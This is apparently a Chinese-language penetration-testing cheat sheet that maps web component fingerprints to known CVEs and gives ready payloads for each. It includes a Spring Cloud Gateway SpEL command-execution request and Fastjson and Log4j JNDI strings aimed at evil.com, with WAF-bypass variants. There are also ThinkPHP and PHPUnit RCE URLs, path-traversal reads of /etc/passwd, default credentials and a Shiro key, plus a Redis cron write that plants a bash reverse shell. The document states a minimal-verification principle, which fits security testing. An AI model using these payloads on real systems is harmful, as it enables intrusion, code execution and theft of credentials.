# 组件漏洞速查与验证

## 指纹→CVE匹配流程

1. **识别组件+版本**：响应头/报错页面/JS文件/特定路径
2. **查CVE**：本文速查 或 `curl -sk "https://cve.circl.lu/api/search/{component}/{version}" -x http://127.0.0.1:7890`
3. **找PoC**：GitHub搜索 `CVE-XXXX-XXXX poc`
4. **验证**：用最小PoC确认，不做破坏性利用

---

## Java生态

### Spring Boot Actuator（未授权）
```
# 探测路径
/actuator /actuator/env /actuator/heapdump /actuator/mappings
/actuator/configprops /actuator/beans /actuator/trace
/manage/env /env /health /info /metrics

# heapdump提取密钥
下载 /actuator/heapdump → JVisualVM/MAT分析 → 搜索password/secret/key
```

### Spring Cloud Gateway RCE (CVE-2022-22947)
```http
POST /actuator/gateway/routes/hacktest HTTP/1.1
Content-Type: application/json

{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}"}}],"uri":"http://example.com"}

# 刷新路由
POST /actuator/gateway/refresh
# 触发
GET /hacktest
```

### Shiro反序列化
```
# 特征：响应头 rememberMe=deleteMe
# 默认密钥：kPH+bIxk5D2deZiIxcaaaA==

# 探测（DNSLOG/延时）
Cookie: rememberMe={serialized_payload}
```

### Fastjson RCE
```json
# 版本探测
{"@type":"java.lang.AutoCloseable"
# 1.2.24以下
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exp","autoCommit":true}
# 1.2.47绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exp","autoCommit":true}}
```

### Log4j (CVE-2021-44228)
```
# 注入点：任何被日志记录的字段（UA、Header、参数、路径）
${jndi:ldap://evil.com/a}
${jndi:dns://evil.com/a}

# 绕过WAF
${${lower:j}ndi:${lower:l}dap://evil.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}
```

### Druid未授权
```
/druid/index.html
/druid/login.html (admin/admin, druid/druid)
/druid/weburi.html → 接口发现
/druid/sql.html → SQL监控（可能泄露查询）
```

---

## PHP生态

### ThinkPHP RCE
```
# 5.0.x
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

# 5.1.x
/index.php?s=index/think\Request/input&filter[]=system&data=whoami
```

### Laravel Debug Mode信息泄露
```
# 特征：Whoops错误页面
/_ignition/execute-solution (CVE-2021-3129)
/.env 文件泄露
```

### PHPUnit RCE (CVE-2017-9841)
```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1

<?php echo system('whoami'); ?>
```

---

## JavaScript/Node.js

### Express/Node原型链污染
```json
POST /api/merge
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

### Next.js中间件绕过 (CVE-2025-29927)
```http
GET /admin HTTP/1.1
x-middleware-subrequest: middleware
```

---

## 中间件/服务器

### Nginx路径穿越（配置错误）
```
# location /static { alias /var/www/; }
/static../etc/passwd

# location /api/ { proxy_pass http://backend/; }  (多一个/)
/api/../../etc/passwd
```

### Apache Tomcat
```
# Manager弱口令
/manager/html (tomcat/tomcat, admin/admin)
# PUT上传 (CVE-2017-12615)
PUT /shell.jsp/ HTTP/1.1
# AJP幽灵猫 (CVE-2020-1938) port 8009
```

### Redis未授权
```bash
redis-cli -h target -p 6379
> INFO  # 确认未授权
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/evil/port 0>&1\n\n"
> SAVE
```

### Elasticsearch未授权
```
GET /_cat/indices
GET /_search?q=password
GET /_nodes
```

---

## CMS

### WordPress
```
/wp-json/wp/v2/users  # 用户枚举
/wp-json/  # REST API信息
/?author=1  # 用户名枚举
/xmlrpc.php  # 暴力破解/SSRF

# WPScan
wpscan --url target --enumerate p,t,u
```

### 致远OA
```
/seeyon/htmlofficeservlet  # 反序列化
/seeyon/thirdpartyController.do  # 未授权
/seeyon/autoinstall.do.css/..;/ajax.do  # 路径穿越
```

### 用友NC
```
/servlet/~ic/bsh.servlet.BshServlet  # 命令执行
/NCFindWeb?service=IPreAlertConfigService  # 反序列化
```

---

## 快速指纹识别

| 特征 | 组件 |
|------|------|
| `X-Powered-By: Express` | Node.js Express |
| `Server: Apache-Coyote` | Tomcat |
| `rememberMe=deleteMe` | Shiro |
| `JSESSIONID` | Java Servlet |
| `ASP.NET_SessionId` | .NET |
| `laravel_session` | Laravel |
| `think_lang` cookie | ThinkPHP |
| `/druid/` 路径存在 | Alibaba Druid |
| `X-Application-Context` | Spring Boot |
| `Whitelabel Error Page` | Spring Boot |
| `/swagger-ui.html` | Swagger/SpringFox |
| `wp-content/` 路径 | WordPress |

---

## 使用原则

1. **版本确认优先**：很多CVE有严格版本限制，先确认版本再尝试
2. **最小验证**：RCE只执行`whoami`/`id`，不做实际入侵
3. **记录版本**：发现组件版本后记录，供报告引用
4. **关注最新**：本文件为静态参考，新CVE需查在线数据库确认
